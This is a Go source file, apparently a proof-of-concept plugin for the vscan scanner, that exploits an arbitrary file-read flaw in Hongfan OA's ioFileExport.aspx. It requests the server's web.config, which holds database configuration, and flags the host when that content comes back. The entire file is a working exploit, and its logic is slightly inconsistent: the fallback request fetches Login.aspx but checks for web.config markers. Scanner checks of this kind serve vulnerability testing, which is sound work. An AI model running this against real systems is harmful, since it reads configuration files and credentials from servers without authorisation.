package hongfanioffice

import (
	"fmt"
	"github.com/veo/vscan/pkg"
	"strings"
)

//红帆OA ioFileExport.aspx 任意文件读取漏洞

func IoFileExport(u string) bool {
	url1 := u + "/ioffice/prg/set/iocom/ioFileExport.aspx?url=/ioffice/web.config&filename=test.txt&ContentType=application/octet-stream"
	url2 := u + "/ioffice/prg/set/iocom/ioFileExport.aspx?url=/ioffice/Login.aspx&filename=test.txt&ContentType=application/octet-stream"
	if req, err := pkg.HttpRequset(url1, "GET", "", false, nil); err == nil {
		if req.StatusCode == 200 && strings.Contains(req.Body, "<DbConfig>") && strings.Contains(req.Body, "<configSection>") && strings.Contains(req.Body, "<iOfficeUpload>") {
			pkg.GoPocLog(fmt.Sprintf("Found vuln 红帆OA ioFileExport.aspx 任意文件读取漏洞 |%s\n", u+"/ioffice/prg/set/iocom/ioFileExport.aspx?url=/ioffice/Login.aspx&filename=test.txt&ContentType=application/octet-stream"))
			return true
		}
	}
	if req, err := pkg.HttpRequset(url2, "GET", "", false, nil); err == nil {
		if req.StatusCode == 200 && strings.Contains(req.Body, "<DbConfig>") && strings.Contains(req.Body, "<configSection>") && strings.Contains(req.Body, "<iOfficeUpload>") {
			pkg.GoPocLog(fmt.Sprintf("Found vuln 红帆OA ioFileExport.aspx 任意文件读取漏洞 |%s\n", u+"/ioffice/prg/set/iocom/ioFileExport.aspx?url=/ioffice/Login.aspx&filename=test.txt&ContentType=application/octet-stream"))
			return true
		}
	}
	return false
}
